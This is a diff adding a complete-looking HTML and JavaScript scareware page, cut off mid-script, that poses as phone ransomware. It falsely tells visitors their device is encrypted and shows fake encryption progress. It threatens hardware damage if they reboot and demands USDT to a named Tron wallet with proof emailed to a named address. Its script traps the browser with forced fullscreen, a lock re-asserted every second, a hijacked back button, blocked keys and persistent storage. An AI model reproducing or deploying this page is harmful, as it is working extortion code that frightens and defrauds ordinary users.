@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="theme-color" content="#000000">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="SYSTEM LOCKED">
+<title>⚠ SYSTEM LOCKED</title>
+<link rel="manifest" href="/manifest.webmanifest">
+<style>
+*,*::before,*::after{box-sizing:border-box}
+html,body{
+  margin:0;padding:0;height:100%;width:100%;
+  position:fixed;inset:0;overflow:hidden;
+  background:#000;color:#d8d8d8;
+  font-family:ui-monospace,"SF Mono",Menlo,Consolas,"Courier New",monospace;
+  overscroll-behavior:none;touch-action:manipulation;
+  -webkit-user-select:none;user-select:none;
+  -webkit-touch-callout:none;-webkit-tap-highlight-color:transparent;
+  -webkit-text-size-adjust:100%;
+}
+.hidden{display:none!important}
+.screen{position:fixed;inset:0;display:flex;flex-direction:column}
+#lock{z-index:2147483647;background:radial-gradient(120% 80% at 50% 0%,#170305 0%,#000 60%);overscroll-behavior:contain}
+.scroller{flex:1 1 auto;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;overscroll-behavior:contain;padding:0 18px 40px}
+.topbar{flex:0 0 auto;display:flex;align-items:center;justify-content:space-between;
+  padding:14px 16px;padding-top:calc(14px + env(safe-area-inset-top,0px));
+  font-size:11px;letter-spacing:.12em;border-bottom:1px solid #1e1e1e;background:#000}
+.rec{display:inline-flex;align-items:center;gap:7px;color:#ff3b3b}
+.rec i{width:8px;height:8px;border-radius:50%;background:#ff2b2b;box-shadow:0 0 10px #ff2b2b;animation:pulse 1.4s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
+.clock{color:#8a8a8a;font-variant-numeric:tabular-nums}
+.mini{margin:12px 18px 0;padding:10px 12px;font-size:11px;line-height:1.5;color:#ffcf5c;border:1px solid #4a3a10;background:#171003}
+.installbar{display:flex;align-items:center;justify-content:space-between;gap:10px;margin:12px 18px 0;
+  padding:10px 12px;font-size:11px;color:#9fd6ff;border:1px solid #123a55;background:#05131d}
+.hint{position:fixed;left:0;right:0;bottom:0;z-index:2147483647;padding:12px;text-align:center;
+  font-size:11px;letter-spacing:.14em;color:#000;background:#ff2b2b}
+.btn-mini{font:inherit;font-size:10px;letter-spacing:.1em;padding:7px 11px;color:#fff;
+  background:#2a2a2a;border:1px solid #444;cursor:pointer;flex:0 0 auto}
+.btn-mini:active{background:#3a3a3a}
+.btn-mini.wide{width:100%;padding:13px;font-size:12px;margin-top:18px}
+.boot{padding:46px 4px;text-align:center;font-size:12px}
+.boot-label{color:#ff3b3b;letter-spacing:.18em;margin:0 0 20px}
+.bar{height:6px;background:#1a1a1a;border:1px solid #2a2a2a;overflow:hidden}
+.bar>div{height:100%;background:linear-gradient(90deg,#8b0000,#ff2b2b);transition:width .18s linear}
+.pct{color:#fff;font-size:26px;font-weight:700;margin:14px 0 8px;font-variant-numeric:tabular-nums}
+.bootline{color:#6a6a6a;font-size:11px;margin:0;min-height:1.4em;word-break:break-all}
+.content{padding-top:18px;max-width:520px;margin:0 auto}
+.hero{position:relative;margin:0 0 20px}
+.hero-img{display:block;width:100%;border:1px solid #241012;filter:contrast(1.1) saturate(.85)}
+.hero-glow{position:absolute;inset:0;background:radial-gradient(60% 60% at 50% 100%,rgba(255,0,0,.22),transparent 70%);pointer-events:none}
+.glitch{position:relative;font-size:25px;line-height:1.15;letter-spacing:.02em;margin:0 0 16px;
+  color:#fff;text-shadow:0 0 18px rgba(255,0,0,.55)}
+.glitch::before,.glitch::after{content:attr(data-text);position:absolute;left:0;top:0;width:100%;overflow:hidden;pointer-events:none}
+.glitch::before{color:#ff2b2b;transform:translate(2px,-2px);opacity:.8;animation:gl1 3.2s infinite steps(2)}
+.glitch::after{color:#00e5ff;transform:translate(-2px,2px);opacity:.6;animation:gl2 2.7s infinite steps(2)}
+@keyframes gl1{0%,92%,100%{clip-path:inset(0 0 0 0)}94%{clip-path:inset(20% 0 55% 0)}96%{clip-path:inset(60% 0 12% 0)}}
+@keyframes gl2{0%,90%,100%{clip-path:inset(0 0 0 0)}93%{clip-path:inset(45% 0 30% 0)}97%{clip-path:inset(8% 0 70% 0)}}
+.lead{font-size:13.5px;line-height:1.65;color:#b6b6b6;margin:0 0 20px}
+.lead b{color:#ff4a4a}
+.warn{border:1px solid #3d1010;border-left:3px solid #ff2b2b;background:#0d0404;padding:14px 16px;margin:0 0 24px}
+.warn-h{margin:0 0 10px;font-size:12px;color:#ff5a5a;letter-spacing:.08em}
+.warn ul{margin:0 0 12px;padding-left:18px;font-size:12.5px;line-height:1.7;color:#c8c8c8}
+.warn ul b{color:#fff}
+.warn-f{margin:0;font-size:12px;line-height:1.65;color:#8f8f8f}
+.warn-f b{color:#ff6b6b}
+.pay{border:1px solid #1e1e1e;background:#070707;padding:18px 16px;margin:0 0 24px}
+.pay-h{margin:0 0 14px;font-size:12px;letter-spacing:.1em;color:#ff4a4a}
+.amount{font-size:34px;font-weight:700;color:#fff;display:flex;align-items:baseline;gap:8px;flex-wrap:wrap}
+.amount small{font-size:13px;color:#7a7a7a;font-weight:400;letter-spacing:.1em}
+.late{font-size:10px;font-style:normal;letter-spacing:.1em;color:#000;background:#ff2b2b;padding:3px 6px;align-self:center;animation:pulse 1s infinite}
+.pay-sub{font-size:11px;color:#6a6a6a;margin:8px 0 16px}
+.addrbox{display:flex;align-items:center;gap:8px;border:1px solid #262626;background:#000;padding:8px 10px}
+.addrbox code{flex:1 1 auto;font-size:10.5px;color:#9be89b;word-break:break-all;line-height:1.5;-webkit-user-select:text;user-select:text}
+.qrwrap{text-align:center;margin:18px 0}
+.qrwrap img{width:180px;height:180px;border:1px solid #262626;image-rendering:pixelated}
+.after{font-size:12px;line-height:1.7;color:#a8a8a8;margin:0 0 8px}
+.after a{color:#6ab7ff;word-break:break-all}
+.tiny{font-size:10.5px;color:#5c5c5c;line-height:1.6;margin:0}
+.unlockbox{border:1px solid #2a1010;background:#0a0505;padding:18px 16px;margin:0 0 24px}
+.unlock-h{margin:0 0 14px;font-size:12px;letter-spacing:.1em;color:#ff4a4a;text-align:center}
+#pin{width:100%;font:inherit;font-size:22px;letter-spacing:.5em;text-align:center;padding:14px 12px;
+  color:#fff;background:#000;border:1px solid #3a3a3a;outline:none;-webkit-user-select:text;user-select:text}
+#pin:focus{border-color:#ff2b2b;box-shadow:0 0 0 2px rgba(255,43,43,.18)}
+#pin::placeholder{color:#333;letter-spacing:.3em}
+#go{width:100%;margin-top:12px;font:inherit;font-size:13px;letter-spacing:.12em;padding:15px;color:#fff;
+  background:linear-gradient(180deg,#c41414,#8b0000);border:1px solid #ff3b3b;cursor:pointer}
+#go:active{background:#6d0000}
+#go:disabled{background:#2a2a2a;border-color:#444;color:#888;cursor:default}
+.msg{min-height:1.3em;margin:12px 0 0;font-size:11.5px;color:#ff6b6b;text-align:center}
+.shake{animation:shake .3s}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+.foot{display:flex;justify-content:space-between;gap:10px;font-size:10px;color:#4d4d4d;
+  border-top:1px solid #161616;padding-top:14px;margin-bottom:20px}
+.relock{color:#777;cursor:pointer}
+.relock:active{color:#ff2b2b}
+.sig b{color:#666}
+#done{z-index:2147483646;background:#000;align-items:center;justify-content:center;padding:24px}
+.done-card{max-width:380px;text-align:center}
+.done-ico{width:66px;height:66px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;
+  font-size:34px;color:#4dff88;border:2px solid #4dff88;border-radius:50%;box-shadow:0 0 26px rgba(77,255,136,.35)}
+.done-card h2{font-size:20px;letter-spacing:.1em;color:#fff;margin:0 0 12px}
+.done-card p{font-size:12.5px;line-height:1.7;color:#9a9a9a;margin:0 0 10px}
+@media(min-width:700px){.glitch{font-size:34px}.lead{font-size:14.5px}}
+</style>
+</head>
+<body class="locked">
+
+<div id="lock" class="screen">
+  <div class="topbar">
+    <span class="rec"><i></i>ENCRYPTION ACTIVE</span>
+    <span id="clock" class="clock">23:59:58</span>
+  </div>
+
+  <div id="mini" class="mini hidden">Opera Mini detected — JavaScript is limited. Use full Chrome or Firefox.</div>
+
+  <div id="installbar" class="installbar hidden">
+    <span>Install to home screen — the lock survives reboot</span>
+    <button id="installbtn" class="btn-mini" type="button">INSTALL</button>
+  </div>
+
+  <div class="scroller">
+    <div id="boot" class="boot">
+      <p class="boot-label">ENCRYPTING DEVICE…</p>
+      <div class="bar"><div id="barfill" style="width:0%"></div></div>
+      <p id="bootpct" class="pct">0%</p>
+      <p id="bootline" class="bootline">initialising …</p>
+    </div>
+
+    <main id="content" class="content hidden">
+      <div class="hero">
+        <img src="/assets/scary.jpg" alt="" class="hero-img">
+        <div class="hero-glow"></div>
+      </div>
+
+      <h1 class="glitch" data-text="YOUR PHONE HAS BEEN HACKED">YOUR PHONE HAS BEEN HACKED</h1>
+
+      <p class="lead">All files, photos, videos, contacts and chats on this device are <b>ENCRYPTED</b>.
+      The display driver is hooked into the boot layer. This phone is unusable until the unlock PIN is entered below.</p>
+
+      <div class="warn">
+        <p class="warn-h">⚠ DO NOT DO ANY OF THE FOLLOWING</p>
+        <ul>
+          <li><b>DO NOT power off</b> the phone</li>
+          <li><b>DO NOT restart / reboot</b> it</li>
+          <li><b>DO NOT flash the firmware</b> or reset to factory</li>
+        </ul>
+        <p class="warn-f">The key is held in volatile memory. Powering off, rebooting or flashing
+        <b>will permanently damage the display panel controller</b> and the screen may never come back.
+        Only the PIN restores it.</p>
+      </div>
+
+      <section class="pay">
+        <p class="pay-h">TO UNLOCK — PAY THE RELEASE FEE</p>
+        <div class="amount"><span id="amt">10</span> <small>USDT</small><em id="late" class="late hidden">PRICE DOUBLED</em></div>
+        <p class="pay-sub">TRC20 network only — Tron / TRC20 wallet</p>
+        <div class="addrbox">
+          <code id="addr">TEpUFeVXKJdFHqjZccqAU2zVQLgTvAzvtu</code>
+          <button id="copy" class="btn-mini" type="button">COPY</button>
+        </div>
+        <div class="qrwrap">
+          <img id="qr" alt="TRC20 payment QR" width="180" height="180"
+            src="https://api.qrserver.com/v1/create-qr-code/?size=360x360&margin=8&color=ff2b2b&bgcolor=000000&data=TEpUFeVXKJdFHqjZccqAU2zVQLgTvAzvtu">
+        </div>
+        <p class="after">After paying, send proof to:<br>
+          <a id="mail" href="mailto:carolinawood2530@gmail.com?subject=UNLOCK%20PIN%20REQUEST%20-%2010%20USDT%20SENT">carolinawood2530@gmail.com</a></p>
+        <p class="tiny">Include your TXID. The PIN is released manually, usually within minutes.</p>
+      </section>
+
+      <section class="unlockbox">
+        <p class="unlock-h">ENTER UNLOCK PIN</p>
+        <form id="form" autocomplete="off">
+          <input id="pin" type="password" inputmode="numeric" pattern="[0-9]*" maxlength="8"
+                 placeholder="••••••••" aria-label="Unlock PIN">
+          <button id="go" type="submit">UNLOCK DEVICE</button>
+        </form>
+        <p id="msg" class="msg"></p>
+      </section>
+
+      <footer class="foot">
+        <span id="relock" class="relock">↻ relock</span>
+        <span class="sig">DEVICE ID: <b id="did">TRX-000000</b></span>
+      </footer>
+    </main>
+  </div>
+</div>
+
+<div id="done" class="screen done hidden">
+  <div class="done-card">
+    <div class="done-ico">✓</div>
+    <h2>ACCESS RESTORED</h2>
+    <p>PIN accepted. The device is decrypted and back under your control.</p>
+    <p class="tiny">Thank you for paying.</p>
+    <button id="again" class="btn-mini wide" type="button">Lock this device again</button>
+  </div>
+</div>
+
+<noscript>
+  <div class="screen" style="padding:20px">
+    <h1 class="glitch">YOUR PHONE HAS BEEN HACKED</h1>
+    <div class="warn">
+      <p class="warn-h">⚠ DO NOT POWER OFF / REBOOT / FLASH</p>
+      <p class="warn-f">The panel controller will be permanently damaged.</p>
+    </div>
+    <section class="pay">
+      <p class="pay-h">PAY 10 USDT — TRC20 ONLY</p>
+      <div class="addrbox"><code>TEpUFeVXKJdFHqjZccqAU2zVQLgTvAzvtu</code></div>
+      <p class="after">Send proof to<br><b>carolinawood2530@gmail.com</b></p>
+      <p class="tiny">JavaScript is disabled. The PIN is sent to you by email.</p>
+    </section>
+  </div>
+</noscript>
+
+<script>
+(function(){
+"use strict";
+
+var CONFIG = {
+  address:"TEpUFeVXKJdFHqjZccqAU2zVQLgTvAzvtu",
+  email:"carolinawood2530@gmail.com",
+  amount:10, amountLate:20, deadlineHours:24,
+  maxTries:3, cooldown:45, key:"vlock_v3", cookie:"vlk3"
+};
+var PIN_HASH = "ad57559";
+function hash(s){var h=5381;for(var i=0;i<s.length;i++)h=((h*33)+s.charCodeAt(i))>>>0;return h.toString(16);}
+function $(id){return document.getElementById(id);}
+
+var lockEl=$("lock"),doneEl=$("done"),content=$("content"),boot=$("boot"),
+    barfill=$("barfill"),bootpct=$("bootpct"),bootline=$("bootline"),
+    pinEl=$("pin"),form=$("form"),goEl=$("go"),msg=$("msg"),clockEl=$("clock");
+
+/* ============ RESET SWITCH (?reset) ============ */
+try{
+  if(/[?&]reset/.test(location.search)){
+    localStorage.removeItem(CONFIG.key);
+    sessionStorage.removeItem(CONFIG.key);
+    sessionStorage.removeItem("vlock_session");
+    document.cookie=CONFIG.cookie+"=;path=/;max-age=0";
+    document.cookie="vlk=;path=/;max-age=0";
+    try{history.replaceState(null,"",location.pathname);}catch(e){}
+  }
+}catch(e){}
+
+/* ============ STORAGE ============ */
+function read(){
+  var s={};
+  try{var m=document.cookie.match(new RegExp(CONFIG.cookie+"=([^;]+)"));if(m)s=Object.assign(s,JSON.parse(decodeURIComponent(m[1])));}catch(e){}
+  try{var t=sessionStorage.getItem(CONFIG.key);if(t)s=Object.assign(s,JSON.parse(t));}catch(e){}
+  try{var l=localStorage.getItem(CONFIG.key);if(l)s=Object.assign(s,JSON.parse(l));}catch(e){}
+  return s;
+}
+function write(s){
+  var raw=JSON.stringify(s);
+  try{localStorage.setItem(CONFIG.key,raw);}catch(e){}
+  try{sessionStorage.setItem(CONFIG.key,raw);}catch(e){}
+  try{document.cookie=CONFIG.cookie+"="+encodeURIComponent(raw)+";path=/;max-age=31536000;SameSite=Lax";}catch(e){}
+}
+
+var state=read();
+if(!state.firstSeen){state.firstSeen=Date.now();write(state);}
+
+/* re-arm on every fresh open: tab closed, app killed, reboot */
+var SESSION_KEY="vlock_session";
+if(!sessionStorage.getItem(SESSION_KEY)){
+  state.unlocked=false; state.tries=0; state.coolUntil=0; write(state);
+}
+sessionStorage.setItem(SESSION_KEY,"1");
+
+var locked=!state.unlocked;
+
+try{ if(navigator.storage && navigator.storage.persist) navigator.storage.persist(); }catch(e){}
+
+$("did").textContent="TRX-"+hash(String(state.firstSeen)).toUpperCase().padEnd(6,"0").slice(0,6);
+
+/* ============ FULLSCREEN / WAKE ============ */
+var wakeLock=null;
+function goFull(){
+  try{
+    var d=document.documentElement;
+    if(!document.fullscreenElement && !document.webkitFullscreenElement){
+      var fn=d.requestFullscreen||d.webkitRequestFullscreen||d.msRequestFullscreen;
+      if(fn){var r=fn.call(d,{navigationUI:"hide"});if(r&&r.catch)r.catch(function(){});}
+    }
+  }catch(e){}
+  hideHint();
+}
+function keepAwake(){
+  try{
+    if("wakeLock" in navigator && !wakeLock){
+      navigator.wakeLock.request("screen").then(function(w){
+        wakeLock=w; w.addEventListener("release",function(){wakeLock=null;});
+      }).catch(function(){});
+    }
+  }catch(e){}
+}
+function lockOrientation(){
+  try{ if(screen.orientation && screen.orientation.lock) screen.orientation.lock("portrait").catch(function(){}); }catch(e){}
+}
+
+var hintEl=null;
+function showHint(){
+  if(!locked||hintEl||document.fullscreenElement) return;
+  hintEl=document.createElement("div");
+  hintEl.className="hint";
+  hintEl.textContent="TAP ANYWHERE TO SECURE";
+  document.body.appendChild(hintEl);
+}
+function hideHint(){ if(hintEl){hintEl.remove();hintEl=null;} }
+
+/* ============ RE-ASSERT ============ */
+function reassert(){
+  if(!locked) return;
+  try{
+    document.body.classList.add("locked");
+    lockEl.classList.remove("hidden");
+    lockEl.style.display="";
+    doneEl.classList.add("hidden");
+  }catch(e){}
+  goFull(); keepAwake();
+}
+
+function showDone(){
+  try{
+    lockEl.classList.add("hidden");
+    content.classList.add("hidden");
+    doneEl.classList.remove("hidden");
+    document.body.classList.remove("locked");
+  }catch(e){}
+  hideHint();
+}
+
+/* ============ BOOT ============ */
+var LINES=["scanning /storage/emulated/0 …","mounting display controller …","locking /data/media …",
+"encrypting gallery · 2,431 items","encrypting contacts · 604 entries","encrypting /sdcard/WhatsApp …",
+"sealing key in volatile memory …","hook installed in boot layer ✓"];
+var bootDone=false;
+function reveal(){
+  if(bootDone)return; bootDone=true;
+  try{ boot.classList.add("hidden"); }catch(e){}
+  if(locked){ try{ content.classList.remove("hidden"); }catch(e){} }
+  else showDone();
+  beep(160,0.16);
+}
+function runBoot(){
+  try{
+    var p=0,i=0;
+    var tick=setInterval(function(){
+      p=Math.min(100,p+Math.random()*13+5);
+      barfill.style.width=p+"%";
+      bootpct.textContent=Math.floor(p)+"%";
+      if(p>i*12.5&&i<LINES.length)bootline.textContent=LINES[i++];
+      if(p>=100){clearInterval(tick);setTimeout(reveal,300);}
+    },170);
+  }catch(e){reveal();}
+}
+
+/* ============ AUDIO ============ */
+var ac;
+function beep(freq,dur,type){
+  try{
+    ac=ac||new (window.AudioContext||window.webkitAudioContext)();
+    var o=ac.createOscillator(),g=ac.createGain();
+    o.type=type||"square"; o.frequency.value=freq; g.gain.value=0.05;
+    o.connect(g); g.connect(ac.destination);
+    o.start(); o.stop(ac.currentTime+dur);
+  }catch(e){}
+}
+
+/* ============ THE PRISON ============ */
+function prison(){
+  function grab(){ goFull(); keepAwake(); lockOrientation(); }
+
+  document.addEventListener("pointerdown",grab,{passive:true});
+  document.addEventListener("touchstart",grab,{passive:true});
+  document.addEventListener("click",grab,{passive:true});
+  document.addEventListener("wheel",function(e){if(e.ctrlKey)e.preventDefault();},{passive:false});
+
+  ["fullscreenchange","webkitfullscreenchange"].forEach(function(ev){
+    document.addEventListener(ev,function(){
+      if(locked && !document.fullscreenElement && !document.webkitFullscreenElement)
+        setTimeout(goFull,60);
+    });
+  });
+
+  document.addEventListener("keydown",function(e){
+    if(!locked)return;
+    var k=(e.key||"").toLowerCase();
+    if(k==="escape"||k==="f11"){e.preventDefault();goFull();}
+    if(k==="f5"||(e.ctrlKey&&k==="r")){e.preventDefault();reassert();}
+    if(k==="backspace"&&e.target===document.body)e.preventDefault();
+    if(e.altKey&&k==="arrowleft")e.preventDefault();
+  },true);
+
+  document.addEventListener("visibilitychange",function(){ if(!document.hidden) reassert(); });
+  document.addEventListener("focus",reassert);
+  window.addEventListener("focus",reassert);
+  window.addEventListener("resize",reassert);
+  window.addEventListener("orientationchange",function(){setTimeout(reassert,250);});
+  window.addEventListener("pageshow",function(e){ if(e.persisted||!state.unlocked) reassert(); });
+  document.addEventListener("contextmenu",function(e){e.preventDefault();});
+  document.addEventListener("dragstart",function(e){e.preventDefault();});
+  document.addEventListener("selectstart",function(e){
+    if(e.target.tagName!=="INPUT"&&e.target.tagName!=="CODE")e.preventDefault();
+  });
+  document.addEventListener("gesturestart",function(e){e.preventDefault();});
+
+  try{
+    history.pushState({lock:1},"",location.href);
+    window.addEventListener("popstate",function(){
+      if(!locked)return;
+      history.pushState({lock:1},"",location.href);
+      reassert();
+    });
+  }catch(e){}
+
+  window.addEventListener("beforeunload",function(e){
+    if(!locked)return;
+    e.preventDefault(); e.returnValue="Device is encrypted.";
+  });
+
+  setInterval(reassert,1000);
+  setTimeout(showHint,1800);
+}
+
+/* ============ OPERA MINI ============ */
+if(/Opera Mini/i.test(navigator.userAgent))$("mini").classList.remov
